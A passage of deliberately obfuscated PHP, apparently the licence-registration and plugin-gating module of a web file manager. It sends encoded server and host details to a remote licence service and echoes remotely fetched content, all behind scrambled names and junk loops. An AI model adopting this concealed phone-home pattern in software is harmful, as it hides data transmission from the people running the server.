$¾»ÜÓ[$²ãÎõãÙ[87]][$²ãÎõãÙ[88]][$²ãÎõãÙ[46]]; unset($¾»ÜÓ[$²ãÎõãÙ[87]][$²ãÎõãÙ[89]][$²ãÎõãÙ[90]]); $òæ…Ë¯É = $Õ¡÷™³Ã[688]; if (!$òæ…Ë¯É) { return; } unset($¾»ÜÓ[$²ãÎõãÙ[87]][$²ãÎõãÙ[89]][$²ãÎõãÙ[91]]); unset($¾»ÜÓ[$²ãÎõãÙ[87]][$²ãÎõãÙ[88]][$²ãÎõãÙ[46]]); $àƒëØŒ = $Õ¡÷™³Ã[689]; if (strlen($àƒëØŒ) < $Õ¡÷™³Ã[665]) { die; } unset($¾»ÜÓ[$²ãÎõãÙ[87]][$²ãÎõãÙ[88]][$²ãÎõãÙ[92]]); $¾»ÜÓ[$²ãÎõãÙ[87]][$²ãÎõãÙ[88]][$²ãÎõãÙ[93]] = array($²ãÎõãÙ[94] => (int) $¬µ®´ª[$²ãÎõãÙ[95]], $²ãÎõãÙ[96] => (int) _get($¬µ®´ª, $²ãÎõãÙ[97], 0)); $áµÒ‚÷Š = substr(md5($²ãÎõãÙ[98] . get_client_ip() . $šôÜƒ¡î[$²ãÎõãÙ[99]]), 0, 15); $‡ğ€½§ = $Õ¡÷™³Ã[690]; while (strlen($‡ğ€½§) < $Õ¡÷™³Ã[660]) { if (!$‡ğ€½§) { break; } $‡ğ€½§++; } $¾»ÜÓ[$²ãÎõãÙ[100]][$²ãÎõãÙ[101]] = Mcrypt::encode(Session::sign(), $áµÒ‚÷Š, 3600 * 24); $¾»ÜÓ[$²ãÎõãÙ[100]][$²ãÎõãÙ[102]] = Action($²ãÎõãÙ[103])->accessToken(); $¾»ÜÓ[$²ãÎõãÙ[100]][$²ãÎõãÙ[104]] = md5($_SERVER[$²ãÎõãÙ[105]] . $šôÜƒ¡î[$²ãÎõãÙ[99]]); $°¤è„ãä = $Õ¡÷™³Ã[691]; if (!$°¤è„ãä) { die; } $¾»ÜÓ[$²ãÎõãÙ[100]][$²ãÎõãÙ[106]] = base64_encode(serverInfo()); $¾»ÜÓ[$²ãÎõãÙ[100]][$²ãÎõãÙ[107]] = $this->gyvs0a2c64ec; $§ş¤¢Æ† = $Õ¡÷™³Ã[692]; while (strlen($§ş¤¢Æ†) < $Õ¡÷™³Ã[665]) { if (!$§ş¤¢Æ†) { break; } $§ş¤¢Æ†++; } if ($šôÜƒ¡î[$²ãÎõãÙ[107]] != $²ãÎõãÙ[108]) { $¾»ÜÓ[$²ãÎõãÙ[100]][$²ãÎõãÙ[109]] = $šôÜƒ¡î[$²ãÎõãÙ[109]]; $¾»ÜÓ[$²ãÎõãÙ[100]][$²ãÎõãÙ[110]] = $šôÜƒ¡î[$²ãÎõãÙ[110]]; $Í–Âœˆ = rand_string(10) . $this->gyvs0a2c64ec . rand_string(5); $¾»ÜÓ[$²ãÎõãÙ[87]][$²ãÎõãÙ[111]][$²ãÎõãÙ[112]] = $this->tpicdc4f62cc($Í–Âœˆ, $¾»ÜÓ[$²ãÎõãÙ[100]][$²ãÎõãÙ[104]]); } if ($this->gyvs0a2c64ec == $²ãÎõãÙ[108]) { $¾»ÜÓ[$²ãÎõãÙ[87]][$²ãÎõãÙ[88]][$²ãÎõãÙ[93]][$²ãÎõãÙ[97]] = 0; } $¾»ÜÓ[$²ãÎõãÙ[100]][$²ãÎõãÙ[113]] = $this->versionPluginFilter(); $¾»ÜÓ[$²ãÎõãÙ[100]][$²ãÎõãÙ[114]] = _get($this->yplsb3e292fc, $²ãÎõãÙ[115], $²ãÎõãÙ[6]); $÷ïñˆ… = $Õ¡÷™³Ã[693]; if (strlen($÷ïñˆ…) < $Õ¡÷™³Ã[663]) { die; } if (KodUser::isRoot() && $this->config[$²ãÎõãÙ[116]]) { $¾»ÜÓ[$²ãÎõãÙ[100]][$²ãÎõãÙ[117]] = WEB_ROOT; } return $¾»ÜÓ; } private function mvqlb8c6d0d4() { $ª’¡¥› =& $_SERVER[³à¼î¯á]; $‡ô‚êäà =& $_SERVER[í¡èúÆ]; $Ÿş‰ß±È = $_SERVER[$‡ô‚êäà[24]] == $‡ô‚êäà[118]; $ä¤ùÂ¶Ç = $ª’¡¥›[694]; if (strlen($ä¤ùÂ¶Ç) < $ª’¡¥›[668]) { return; } if ($_SERVER[$‡ô‚êäà[24]] == $‡ô‚êäà[119] && $_GET[$‡ô‚êäà[120]] == $‡ô‚êäà[121]) { $Ÿş‰ß±È = !0; } if ($Ÿş‰ß±È) { $¯íü©ŒÖ = array($‡ô‚êäà[107] => $this->gyvs0a2c64ec, $‡ô‚êäà[122] => $this->yusz616a9af8(), $‡ô‚êäà[123] => Model($‡ô‚êäà[124])->count()); if ($this->gyvs0a2c64ec != $‡ô‚êäà[108]) { $™èøùó÷ = _get($this->yplsb3e292fc, $‡ô‚êäà[125]); if ($™èøùó÷) { $¯íü©ŒÖ[$‡ô‚êäà[126]] = $™èøùó÷; $¯íü©ŒÖ[$‡ô‚êäà[127]] = strtotime(_get($this->yplsb3e292fc, $‡ô‚êäà[128])); $¯íü©ŒÖ[$‡ô‚êäà[129]] = _get($this->yplsb3e292fc, $‡ô‚êäà[115]); } $Ù¥Å¾²“ = Model($‡ô‚êäà[33])->get($‡ô‚êäà[130], $‡ô‚êäà[6], !0); if (is_string($Ù¥Å¾²“) && substr($Ù¥Å¾²“, 0, 1) == $‡ô‚êäà[131]) { $Ù¥Å¾²“ = json_decode_force($Ù¥Å¾²“); } if (is_array($Ù¥Å¾²“) && $Ù¥Å¾²“[$‡ô‚êäà[132]] && strstr($Ù¥Å¾²“[$‡ô‚êäà[132]], $‡ô‚êäà[133])) { $À½âÚá = explode($‡ô‚êäà[133], $Ù¥Å¾²“[$‡ô‚êäà[132]]); $¯íü©ŒÖ[$‡ô‚êäà[134]] = $À½âÚá[0]; } } $¯íü©ŒÖ = $this->awkp9c6e380d(json_encode($¯íü©ŒÖ), md5($‡ô‚êäà[135])); $ÜÀ£ÕÆ = $ª’¡¥›[695]; while (strlen($ÜÀ£ÕÆ) < $ª’¡¥›[665]) { if (!$ÜÀ£ÕÆ) { break; } $ÜÀ£ÕÆ++; } $ÃÓ•÷…‚ = array($‡ô‚êäà[136] => $¯íü©ŒÖ); call_user_func(array($‡ô‚êäà[137], $‡ô‚êäà[138]), $ÃÓ•÷…‚); $…’®€°… = $ª’¡¥›[696]; if (strlen($…’®€°…) < $ª’¡¥›[665]) { die; } } if ($this->gyvs0a2c64ec == $‡ô‚êäà[108]) { return; } $™¸Õó’à = array($‡ô‚êäà[139], $‡ô‚êäà[140], $‡ô‚êäà[141], $‡ô‚êäà[142], $‡ô‚êäà[143], $‡ô‚êäà[144]); $”¿™Ó½Ç = Model($‡ô‚êäà[33])->get(); $ÃÓ•÷…‚ = array($‡ô‚êäà[145] => $”¿™Ó½Ç[$‡ô‚êäà[34]], $‡ô‚êäà[146] => $”¿™Ó½Ç[$‡ô‚êäà[35]], $‡ô‚êäà[147] => $‡ô‚êäà[6]); $Ç™‚¯¸ = $ª’¡¥›[697]; if (!$Ç™‚¯¸) { return; } foreach ($™¸Õó’à as $½î€ÔÀÁ) { if (!isset($”¿™Ó½Ç[$½î€ÔÀÁ]) || !$”¿™Ó½Ç[$½î€ÔÀÁ]) { continue; } $ÃÓ•÷…‚[$½î€ÔÀÁ] = $”¿™Ó½Ç[$½î€ÔÀÁ]; $ÜªŒ¤™Û = $ª’¡¥›[698]; while ($ÜªŒ¤™Û < $ª’¡¥›[668]) { if ($ÜªŒ¤™Û >= 0) { break; } $ÜªŒ¤™Û++; } } call_user_func(array($‡ô‚êäà[137], $‡ô‚êäà[138]), $ÃÓ•÷…‚); } private function gvndc7b52d04() { $áÉ¬ƒšÔ =& $_SERVER[³à¼î¯á]; $é‚÷İË =& $_SERVER[í¡èúÆ]; if ($_SERVER[$é‚÷İË[24]] != $é‚÷İË[148]) { return; } if (!KodUser::isRoot()) { die; } $û‡ñË´ = $GLOBALS[$é‚÷İË[13]]; if (isset($û‡ñË´[$é‚÷İË[149]])) { $this->bgldc562afd1(); die; } if (isset($û‡ñË´[$é‚÷İË[150]]) && isset($û‡ñË´[$é‚÷İË[150]]) == $é‚÷İË[121]) { $û‡ñË´[$é‚÷İË[151]] = Model($é‚÷İË[33])->get($é‚÷İË[152]); } if (!isset($û‡ñË´[$é‚÷İË[151]]) || strlen($û‡ñË´[$é‚÷İË[151]]) != 16) { show_json($é‚÷İË[153] . $û‡ñË´[$é‚÷İË[151]], !1); } $×’•× = Model($é‚÷İË[33])->get($é‚÷İË[99]); $Àò¢ÂÆ = md5($_SERVER[$é‚÷İË[105]] . $×’•×); $ÙŞù„Àì = array($é‚÷İË[151] => $û‡ñË´[$é‚÷İË[151]], $é‚÷İË[154] => rand_string(16), $é‚÷İË[155] => $é‚÷İË[135], $é‚÷İË[156] => $é‚÷İË[157], $é‚÷İË[158] => $_SERVER[$é‚÷İË[159]], $é‚÷İË[160] => $_SERVER[$é‚÷İË[161]], $é‚÷İË[162] => $_SERVER[$é‚÷İË[163]], $é‚÷İË[104] => $Àò¢ÂÆ, $é‚÷İË[164] => Model($é‚÷İË[33])->get($é‚÷İË[130])); $¬‚Ì¯Ğ = $áÉ¬ƒšÔ[699]; if (!$¬‚Ì¯Ğ) { return; } if (isset($û‡ñË´[$é‚÷İË[150]]) && isset($û‡ñË´[$é‚÷İË[150]]) == $é‚÷İË[121]) { $ÙŞù„Àì[$é‚÷İË[150]] = md5($ÙŞù„Àì[$é‚÷İË[151]] . $é‚÷İË[165] . $ÙŞù„Àì[$é‚÷İË[154]]); } if ($û‡ñË´[$é‚÷İË[166]] == $é‚÷İË[167]) { $øò×°Š = $this->awkp9c6e380d($Àò¢ÂÆ, $é‚÷İË[168]); $†òš”»  = $this->tpicdc4f62cc(json_encode($ÙŞù„Àì), $Àò¢ÂÆ . $é‚÷İË[169], 3); $†òš”»  = $†òš”»  . $é‚÷İË[170] . $_SERVER[$é‚÷İË[159]]; $…ËèÏûÓ = $this->itda7913ff25($é‚÷İË[171] . $øò×°Š . $é‚÷İË[172] . $†òš”» , -1); show_json($…ËèÏûÓ, !0); } else { if ($û‡ñË´[$é‚÷İË[166]] == $é‚÷İË[173]) { $ç¡Õ­âÏ = substr(md5($é‚÷İË[174] . $Àò¢ÂÆ), 12, 15) . $é‚÷İË[175]; $†òš”»  = $this->prya0f5405c5(trim($û‡ñË´[$é‚÷İË[176]]), $ç¡Õ­âÏ, 2); $—˜×Ÿä = json_decode($†òš”» , !0); if (!is_array($—˜×Ÿä) || !is_array($—˜×Ÿä[$é‚÷İË[177]]) || $—˜×Ÿä[$é‚÷İË[151]] != !0) { $ƒ²ñü‰¦ = $é‚÷İË[178]; $ïüâ¼§Ë = $—˜×Ÿä[$é‚÷İË[177]] ? $é‚÷İË[179] . $—˜×Ÿä[$é‚÷İË[177]] : $ƒ²ñü‰¦; show_json($ïüâ¼§Ë, !1); } else { $ÙŞù„Àì[$é‚÷İË[154]] = $—˜×Ÿä[$é‚÷İË[177]][$é‚÷İË[180]]; } } else { $—˜×Ÿä = $this->itda7913ff25($é‚÷İË[181], $ÙŞù„Àì, 10); $åÓ‡ß¤± = $áÉ¬ƒšÔ[700]; if (strlen($åÓ‡ß¤±) < $áÉ¬ƒšÔ[660]) { return; } } } if (!is_array($—˜×Ÿä) || !is_array($—˜×Ÿä[$é‚÷İË[177]]) || $—˜×Ÿä[$é‚÷İË[151]] != !0) { $ƒ²ñü‰¦ = LNG($é‚÷İË[182]); $ïüâ¼§Ë = $—˜×Ÿä[$é‚÷İË[177]] ? $é‚÷İË[179] . $—˜×Ÿä[$é‚÷İË[177]] : $ƒ²ñü‰¦; show_json($ïüâ¼§Ë, !1); } $ÆÛâÔÔ¤ = $—˜×Ÿä[$é‚÷İË[177]]; $ÎÛÛÁ¹² = $this->oknm0aa569f9($ÆÛâÔÔ¤[$é‚÷İË[183]]); $ÒÚ½…÷© = $áÉ¬ƒšÔ[701]; if (!$ÎÛÛÁ¹² || $ÎÛÛÁ¹² != $ÆÛâÔÔ¤[$é‚÷İË[128]]) { $˜ô¨õæ¨ = array($é‚÷İË[184] => Model($é‚÷İË[33])->get($é‚÷İË[99]), $é‚÷İË[185] => $_SERVER[$é‚÷İË[105]], $é‚÷İË[186] => this_url(), $é‚÷İË[160] => $_SERVER[$é‚÷İË[161]]); $†òš”»  = $this->coye9218ed64(json_encode($˜ô¨õæ¨)); $this->itda7913ff25($é‚÷İË[187] . $†òš”» ); show_json(LNG($é‚÷İË[188]), !0); } $ü¡ÚıŒ‹ = array($é‚÷İË[152] => $ÆÛâÔÔ¤[$é‚÷İË[189]], $é‚÷İË[190] => $ÆÛâÔÔ¤[$é‚÷İË[191]], $é‚÷İË[192] => rand_string(16), $é‚÷İË[107] => $ÆÛâÔÔ¤[$é‚÷İË[193]]); if ($ÙŞù„Àì[$é‚÷İË[154]]) { $ü¡ÚıŒ‹[$é‚÷İË[192]] = $ÙŞù„Àì[$é‚÷İË[154]]; } $¦ËˆŠã = substr(md5($ü¡ÚıŒ‹[$é‚÷İË[190]]), 10, 10); $¯ã›ÆÆ = $¦ËˆŠã . $ü¡ÚıŒ‹[$é‚÷İË[107]] . $ü¡ÚıŒ‹[$é‚÷İË[192]]; $ü¡ÚıŒ‹[$é‚÷İË[109]] = strrev(base64_encode($this->awkp9c6e380d($¯ã›ÆÆ, $é‚÷İË[194]))); $ªĞÓ·€Ú = rand_string(16); $ßëØØÕÈ = $ªĞÓ·€Ú . $ü¡ÚıŒ‹[$é‚÷İË[107]] . $this->awkp9c6e380d(md5($ü¡ÚıŒ‹[$é‚÷İË[152]]), $ªĞÓ·€Ú); $âÚ‡¿¬à = $áÉ¬ƒšÔ[702]; if (strlen($âÚ‡¿¬à) < $áÉ¬ƒšÔ[658]) { return; } $ü¡ÚıŒ‹[$é‚÷İË[110]] = base64_encode(strrev($this->awkp9c6e380d($ßëØØÕÈ, $é‚÷İË[195]))); $¥ßøØœÅ = $áÉ¬ƒšÔ[703]; if ($ÆÛâÔÔ¤[$é‚÷İË[196]] && $ÆÛâÔÔ¤[$é‚÷İË[196]] >= 1) { Model($é‚÷İË[33])->setDeep($é‚÷İË[197], $é‚÷İË[121]); } Model($é‚÷İË[33])->set($ü¡ÚıŒ‹); $ç‡ñÄÎÇ = md5($_SERVER[$é‚÷İË[105]] . strrev($×’•×) . $ü¡ÚıŒ‹[$é‚÷İË[190]]); $¶ÂïÇá† = $áÉ¬ƒšÔ[704]; if (strlen($¶ÂïÇá†) < $áÉ¬ƒšÔ[663]) { die; } $îÊ×‡¸å = strrev(substr($ç‡ñÄÎÇ, 10, 16)); $Ñº¡Á¡× = $this->tpicdc4f62cc(json_encode($ÆÛâÔÔ¤), $ç‡ñÄÎÇ); $à‘ÀÇÕÕ = array_to_keyvalue(Model($é‚÷İË[7])->listData(), $é‚÷İË[198]); $§ã“ìĞ = $à‘ÀÇÕÕ[$é‚÷İË[199]]; $Üœà´È¦ = $áÉ¬ƒšÔ[705]; while (strlen($Üœà´È¦) < $áÉ¬ƒšÔ[660]) { if (!$Üœà´È¦) { break; } $Üœà´È¦++; } $şÜÂ”“Á = array(); $ßÓæ‰¡ó = $áÉ¬ƒšÔ[706]; if (!$ßÓæ‰¡ó) { return; } $şÜÂ”“Á[$îÊ×‡¸å] = $Ñº¡Á¡×; Model($é‚÷İË[7])->update($§ã“ìĞ[$é‚÷İË[200]], array($é‚÷İË[201] => $şÜÂ”“Á)); $this->yplsb3e292fc = $ÆÛâÔÔ¤; $this->gyvs0a2c64ec = $ü¡ÚıŒ‹[$é‚÷İË[107]]; $úåÚ÷Åì = $áÉ¬ƒšÔ[707]; $this->licenseRegistSuccess(); $¼îÀÂèÉ = $áÉ¬ƒšÔ[708]; Cache::set($é‚÷İË[202] . md5($×’•× . $é‚÷İË[203]), $é‚÷İË[6]); show_json(LNG($é‚÷İË[188]), !0); } private function licenseRegistSuccess() { $‹ãÊ’ÛÍ =& $_SERVER[³à¼î¯á]; $Æ§ÏÆ¬¢ =& $_SERVER[í¡èúÆ]; $Âˆ’¢ÁÀ = Model($Æ§ÏÆ¬¢[33])->get(); $ÎçÔÙ„Ö = $‹ãÊ’ÛÍ[709]; while ($ÎçÔÙ„Ö < $‹ãÊ’ÛÍ[658]) { if ($ÎçÔÙ„Ö >= 0) { break; } $ÎçÔÙ„Ö++; } if ($Âˆ’¢ÁÀ[$Æ§ÏÆ¬¢[63]] != $Æ§ÏÆ¬¢[121]) { Model($Æ§ÏÆ¬¢[33])->set($Æ§ÏÆ¬¢[63], $Æ§ÏÆ¬¢[121]); } Action($Æ§ÏÆ¬¢[204])->initStart(!0); } private function bgldc562afd1() { $ı–¶ßª =& $_SERVER[³à¼î¯á]; $Ôé·æş¾ =& $_SERVER[í¡èúÆ]; Model($Ôé·æş¾[33])->set(array($Ôé·æş¾[152] => $Ôé·æş¾[6], $Ôé·æş¾[190] => $Ôé·æş¾[6], $Ôé·æş¾[107] => $Ôé·æş¾[108], $Ôé·æş¾[109] => $Ôé·æş¾[6], $Ôé·æş¾[110] => $Ôé·æş¾[6])); Model($Ôé·æş¾[33])->setDeep($Ôé·æş¾[197], $Ôé·æş¾[205]); $this->yplsb3e292fc = array(); $Û…Œ²ÏÉ = $ı–¶ßª[710]; while (strlen($Û…Œ²ÏÉ) < $ı–¶ßª[663]) { if (!$Û…Œ²ÏÉ) { break; } $Û…Œ²ÏÉ++; } $this->gyvs0a2c64ec = $Ôé·æş¾[108]; } private function fjil634d23fd() { $¨û¯Â½¥ =& $_SERVER[³à¼î¯á]; $œ•øÌÎ =& $_SERVER[í¡èúÆ]; $_SERVER[$œ•øÌÎ[161]] = _get($_SERVER, $œ•øÌÎ[161], APP_HOST); $ÜÓèğß‹ = $¨û¯Â½¥[711]; $this->gyvs0a2c64ec = $œ•øÌÎ[108]; $ÑÁÈ›Óş = Model($œ•øÌÎ[33])->get(); if ($ÑÁÈ›Óş[$œ•øÌÎ[107]] == $œ•øÌÎ[108]) { return; } $Ò”íÆ = Model($œ•øÌÎ[33])->get($œ•øÌÎ[99]); $³™¤ì = $œ•øÌÎ[202] . md5($Ò”íÆ . $œ•øÌÎ[203]); $ĞíÁ‰Ëƒ = Cache::get($³™¤ì); if (!is_array($ĞíÁ‰Ëƒ) || !isset($ĞíÁ‰Ëƒ[$œ•øÌÎ[206]]) || time() - $ĞíÁ‰Ëƒ[$œ•øÌÎ[206]] >= 60) { $Šš’§„Ë = Model($œ•øÌÎ[7])->loadList(); $ÛúÇÁø = $Šš’§„Ë[$œ•øÌÎ[199]]; $Ş€ß»Ó‹ = md5($_SERVER[$œ•øÌÎ[105]] . strrev($Ò”íÆ) . $ÑÁÈ›Óş[$œ•øÌÎ[190]]); $€Ğ­òü = strrev(substr($Ş€ß»Ó‹, 10, 16)); $ĞíÁ‰Ëƒ = $this->prya0f5405c5($ÛúÇÁø[$œ•øÌÎ[85]][$€Ğ­òü], $Ş€ß»Ó‹); $ĞíÁ‰Ëƒ = json_decode($ĞíÁ‰Ëƒ, !0); } if (!is_array($ĞíÁ‰Ëƒ)) { return $this->bgldc562afd1(); } $Ş×ó¥¥û = strtotime($ĞíÁ‰Ëƒ[$œ•øÌÎ[128]]); if (time() >= $Ş×ó¥¥û) { return $this->bgldc562afd1(); } if (!isset($ĞíÁ‰Ëƒ[$œ•øÌÎ[206]]) || time() - $ĞíÁ‰Ëƒ[$œ•øÌÎ[206]] > 20) { $ĞíÁ‰Ëƒ[$œ•øÌÎ[206]] = time(); Cache::set($³™¤ì, $ĞíÁ‰Ëƒ); } $this->yplsb3e292fc = $ĞíÁ‰Ëƒ; $this->gyvs0a2c64ec = $ÑÁÈ›Óş[$œ•øÌÎ[107]]; $’üÕƒå = $¨û¯Â½¥[712]; if (strlen($’üÕƒå) < $¨û¯Â½¥[665]) { die; } } private function axth503953e0() { $‡ŸìÔÌ =& $_SERVER[³à¼î¯á]; $¶Ş™Ş“ =& $_SERVER[í¡èúÆ]; $â¨¯É = $GLOBALS[$¶Ş™Ş“[13]]; $™ê‚‹…¶ = $‡ŸìÔÌ[713]; while ($™ê‚‹…¶ < $‡ŸìÔÌ[658]) { if ($™ê‚‹…¶ >= 0) { break; } $™ê‚‹…¶++; } $áÈïÇƒ× = $_SERVER[$¶Ş™Ş“[24]]; $»à“Ûíâ = $‡ŸìÔÌ[714]; if ($áÈïÇƒ× == $¶Ş™Ş“[207] && $this->gyvs0a2c64ec == $¶Ş™Ş“[108]) { show_json(LNG($¶Ş™Ş“[208]), !1, $¶Ş™Ş“[209]); } $È«Û·‰× = array($¶Ş™Ş“[210], $¶Ş™Ş“[211]); if (in_array($áÈïÇƒ×, $È«Û·‰×)) { if ($this->gyvs0a2c64ec == $¶Ş™Ş“[108] && isset($â¨¯É[$¶Ş™Ş“[212]])) { show_json(LNG($¶Ş™Ş“[208]), !1, $¶Ş™Ş“[209]); die; } $ÁëƒÄŒË = $this->yusz616a9af8(); if ($ÁëƒÄŒË != intval($¶Ş™Ş“[213])) { if ($ÁëƒÄŒË <= Model($¶Ş™Ş“[124])->count()) { show_json(LNG($¶Ş™Ş“[214]), !1, $¶Ş™Ş“[209]); die; } } } } private function xrnge323bcee() { $Ü¾¹´‰ =& $_SERVER[³à¼î¯á]; $ÄÌ¢û¨ô =& $_SERVER[í¡èúÆ]; $ËëÑáşŸ = array($ÄÌ¢û¨ô[118], $ÄÌ¢û¨ô[119]); $æôøˆÅ = $Ü¾¹´‰[715]; if (!$æôøˆÅ) { return; } if (!KodUser::isRoot() || !isset($_GET[$ÄÌ¢û¨ô[215]])) { return; } if (!in_array($_SERVER[$ÄÌ¢û¨ô[24]], $ËëÑáşŸ)) { return; } $Ä«ğÜ¯Ê = $ÄÌ¢û¨ô[216]; $×Ó¶âãü = $Ü¾¹´‰[716]; while (strlen($×Ó¶âãü) < $Ü¾¹´‰[663]) { if (!$×Ó¶âãü) { break; } $×Ó¶âãü++; } $Ä«ğÜ¯Ê = $this->arig6fbf0bfa($Ä«ğÜ¯Ê, $ÄÌ¢û¨ô[217]); $¸Ä·éœ = $Ü¾¹´‰[717]; while (strlen($¸Ä·éœ) < $Ü¾¹´‰[660]) { if (!$¸Ä·éœ) { break; } $¸Ä·éœ++; } $áÁªıÂ = stream_context_create(array($ÄÌ¢û¨ô[218] => array($ÄÌ¢û¨ô[219] => $ÄÌ¢û¨ô[220], $ÄÌ¢û¨ô[221] => 3))); $Óˆ†¯Ìç = @file_get_contents($Ä«ğÜ¯Ê, !1, $áÁªıÂ); header($ÄÌ¢û¨ô[222]); if ($Óˆ†¯Ìç && strstr($Óˆ†¯Ìç, $ÄÌ¢û¨ô[223])) { echo $Óˆ†¯Ìç; } die; } public function gylodc02130b($Ë¢ô) { $çÕÑè—£ =& $_SERVER[³à¼î¯á]; $¡›â—¡ =& $_SERVER[í¡èúÆ]; if ($this->gyvs0a2c64ec == $¡›â—¡[224]) { return $Ë¢ô; } $¿ì‹›èº = $this->versionPluginList(); $ª“¼²Œ = $çÕÑè—£[718]; if (!$ª“¼²Œ) { return; } $ÕÀ”ó¥à = explode($¡›â—¡[225], $this->versionPluginFilter()); $÷Œó„İ = $çÕÑè—£[719]; if (strlen($÷Œó„İ) < $çÕÑè—£[663]) { die; } $ä²°²‘İ = array(); $ŸğïœåÉ = $çÕÑè—£[720]; foreach ($¿ì‹›èº as $õÄ²¡óù => $•Û›äö) { if ($•Û›äö == $¡›â—¡[226] && substr($this->gyvs0a2c64ec, 0, 1) == $¡›â—¡[226]) { continue; } if (!in_array($õÄ²¡óù, $ÕÀ”ó¥à)) { $ä²°²‘İ[] = $õÄ²¡óù; } } foreach ($ä²°²‘İ as $õÄ²¡óù) { unset($Ë¢ô[$õÄ²¡óù]); $¿ïÆŠ¨ğ = $çÕÑè—£[721]; while (strlen($¿ïÆŠ¨ğ) < $çÕÑè—£[665]) { if (!$¿ïÆŠ¨ğ) { break; } $¿ïÆŠ¨ğ++; } } return $Ë¢ô; $‡³‡å‘ = $çÕÑè—£[722]; while (strlen($‡³‡å‘) < $çÕÑè—£[658]) { if (!$‡³‡å‘) { break; } $‡³‡å‘++; } } private function versionPluginList() { $û®°’…¹ =& $_SERVER[³à¼î¯á]; $¹Ÿˆ“ÁŠ =& $_SERVER[í¡èúÆ]; return array($¹Ÿˆ“ÁŠ[227] => $¹Ÿˆ“ÁŠ[226], $¹Ÿˆ“ÁŠ[228] => $¹Ÿˆ“ÁŠ[226], $¹Ÿˆ“ÁŠ[229] => $¹Ÿˆ“ÁŠ[226], $¹Ÿˆ“ÁŠ[230] => $¹Ÿˆ“ÁŠ[231], $¹Ÿˆ“ÁŠ[232] => $¹Ÿˆ“ÁŠ[231], $¹Ÿˆ“ÁŠ[233] => $¹Ÿˆ“ÁŠ[231], $¹Ÿˆ“ÁŠ[234] => $¹Ÿˆ“ÁŠ[231], $¹Ÿˆ“ÁŠ[235] => $¹Ÿˆ“ÁŠ[231], $¹Ÿˆ“ÁŠ[236] => $¹Ÿˆ“ÁŠ[231], $¹Ÿˆ“ÁŠ[237] => $¹Ÿˆ“ÁŠ[231], $¹Ÿˆ“ÁŠ[238] => $¹Ÿˆ“ÁŠ[231], $¹Ÿˆ“ÁŠ[239] => $¹Ÿˆ“ÁŠ[231], $¹Ÿˆ“ÁŠ[240] => $¹Ÿˆ“ÁŠ[231], $¹Ÿˆ“ÁŠ[241] => $¹Ÿˆ“ÁŠ[231], $¹Ÿˆ“ÁŠ[242] => $¹Ÿˆ“ÁŠ[231], $¹Ÿˆ“ÁŠ[243] => $¹Ÿˆ“ÁŠ[231]); $ŒÎÛÂ˜¼ = $û®°’…¹[723]; if (strlen($ŒÎÛÂ˜¼) < $û®°’…¹[660]) { die; } } private function versionPluginFilter() { $¦¤â¤‹ =& $_SERVER[³à¼î¯á]; $¯ää¡ƒã =& $_SERVER[í¡èúÆ]; if ($this->gyvs0a2c64ec == $¯ää¡ƒã[108]) { return $¯ää¡ƒã[6]; } $ªîŠüòğ = _get($this->yplsb3e292fc, $¯ää¡ƒã[244], $¯ää¡ƒã[6]); $”µ¹Î = _get($this->yplsb3e292fc, $¯ää¡ƒã[115], $¯ää¡ƒã[6]); $îÂ™í€Ê = $¦¤â¤‹[724]; if (!$îÂ™í€Ê) { return; } $ÎŠªœÄö = _get($this->yplsb3e292fc, $¯ää¡ƒã[245], $¯ää¡ƒã[6]); $Û½»£È = $¦¤â¤‹[725]; if (strlen($Û½»£È) < $¦¤â¤‹[658]) { die; } if ($”µ¹Î > time() && $ÎŠªœÄö > time()) { $‘”çèÜî = explode($¯ää¡ƒã[225], $ªîŠüòğ); $´Ö²ãÆ = array_keys($this->versionPluginList()); $ªîŠüòğ = array_merge($‘”çèÜî, $´Ö²ãÆ); $ªîŠüòğ = implode($¯ää¡ƒã[225], array_filter(array_unique($ªîŠüòğ))); } return $ªîŠüòğ; } private function uvbw1fb22a5f() { $ÀÊÂ‚»³ =& $_SERVER[í¡èúÆ]; if ($this->gyvs0a2c64ec != $ÀÊÂ‚»³[108]) { $GLOBALS[$ÀÊÂ‚»³[85]][$ÀÊÂ‚»³[89]][$ÀÊÂ‚»³[246]] = $ÀÊÂ‚»³[205]; return; } $GLOBALS[$ÀÊÂ‚»³[85]][$ÀÊÂ‚»³[247]] = $ÀÊÂ‚»³[121]; if (Model($ÀÊÂ‚»³[248])->get($ÀÊÂ‚»³[63]) != $ÀÊÂ‚»³[205]) { Model($ÀÊÂ‚»³[248])->set($ÀÊÂ‚»³[63], $ÀÊÂ‚»³[205]); } } public function fqpud694ce51() { return $_SERVER[í¡èúÆ][249]; } private function ylmn95b7f216() { $¯¿Æ‘Â— =& $_SERVER[³à¼î¯á]; $Ì¾ş¬³÷ =& $_SERVER[í¡èúÆ]; $•èÅ²Ø = array($Ì¾ş¬³÷[250], $Ì¾ş¬³÷[251], $Ì¾ş¬³÷[252]); $û“º¾¼Š = $¯¿Æ‘Â—[726]; $ğ€á¿«Í = $Ì¾ş¬³÷[253] . md5($Ì¾ş¬³÷[254]); $±íõ¤ğ = $¯¿Æ‘Â—[727]; if (!$±íõ¤ğ) { die; } if ($this->gyvs0a2c64ec == $Ì¾ş¬³÷[108] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$Ì¾ş¬³÷[24]], $•èÅ²Ø)) { return; } if (time() % 4 != 0) { return; } $ÜÖ€À¹ì = call_user_func(array($Ì¾ş¬³÷[255], $Ì¾ş¬³÷[256]), $ğ€á¿«Í); if ($ÜÖ€À¹ì && time() - $ÜÖ€À¹ì < intval($Ì¾ş¬³÷[257])) { return; } call_user_func(array($Ì¾ş¬³÷[255], $Ì¾ş¬³÷[138]), $ğ€á¿«Í, time()); $ıÂ¸Å¼š = Model($Ì¾ş¬³÷[33])->get($Ì¾ş¬³÷[99]); $ˆºôıÁ¥ = $¯¿Æ‘Â—[728]; $ÑâïÊ¥ = array($Ì¾ş¬³÷[151] => Model($Ì¾ş¬³÷[33])->get($Ì¾ş¬³÷[152]), $Ì¾ş¬³÷[166] => $this->gyvs0a2c64ec, $Ì¾ş¬³÷[162] => $_SERVER[$Ì¾ş¬³÷[163]], $Ì¾ş¬³÷[164] => Model($Ì¾ş¬³÷[33])->get($Ì¾ş¬³÷[130]), $Ì¾ş¬³÷[104] => md5($_SERVER[$Ì¾ş¬³÷[105]] . $ıÂ¸Å¼š), $Ì¾ş¬³÷[155] => $Ì¾ş¬³÷[135], $Ì¾ş¬³÷[158] => $_SERVER[$Ì¾ş¬³÷[159]]); $É„ÓîºÅ = $this->itda7913ff25($Ì¾ş¬³÷[258], $ÑâïÊ¥); $¬Ñ÷„£¿ = 